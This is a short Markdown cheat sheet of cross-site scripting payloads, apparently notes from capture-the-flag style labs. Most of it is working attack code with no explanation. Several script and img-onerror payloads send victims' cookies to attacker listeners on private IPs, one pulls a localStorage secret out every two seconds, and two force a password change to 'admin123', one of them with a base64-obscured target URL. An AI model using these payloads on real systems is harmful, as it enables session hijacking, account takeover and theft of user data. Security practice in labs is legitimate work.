# xss payload

## test

`<script>console.log('xss')</script>`

`<script>fetch('http://10.11.72.22/');</script>`

## cookies

`<script>fetch('http://10.10.70.227:8088/?'+btoa(document.cookie));</script>`

`<script>window.location='http://10.10.70.227:4444/?'+document.cookie;</script>`

`<img src=x onerror="window.location='http://10.10.70.227:9001/?'+document.cookie;" />`

---

## change password

```javascript
<script>fetch('/change_password.php',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:"new_password=admin123"});</script>
```
```javascript
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', atob('aHR0cDovL2xvZ2luLndvcmxkd2FwLnRobS9jaGFuZ2VfcGFzc3dvcmQucGhw'), true);
xhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.onreadystatechange = function () {
if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
alert("Action executed!");
}
};
xhr.send('action=execute&new_password=admin123');
</script>
```
---

## DOM getItem

```javascript
<img src="x" onerror="setInterval(function() {fetch('http://10.10.158.224:4242?secret=' + encodeURIComponent(localStorage.getItem('secret'))).then(response => {})},2000);">
```
---